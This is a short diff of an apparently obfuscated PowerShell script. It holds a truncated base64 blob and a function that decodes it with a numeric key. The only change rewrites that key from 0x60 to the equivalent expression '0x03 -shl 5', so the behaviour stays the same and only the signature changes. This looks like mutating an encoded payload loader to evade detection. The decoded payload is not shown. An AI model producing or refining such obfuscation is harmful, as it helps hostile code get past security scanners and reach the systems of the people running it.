@@ -3,7 +3,7 @@ ${b64_data_string} = "CBQUEBNaT08MCVFTVFVYUlVRU1hOBwkUCBUCTgkPTxNPWVEBV1EFUwVVUg
 ${processing_function} = { 
     param(
         [string]${input_data},
-        [int]${transform_value} = 0x60
+        [int]${transform_value} = 0x03 -shl 5
     )
     
     ${base64_converted_data} = [Convert]::FromBase64String(${input_data})
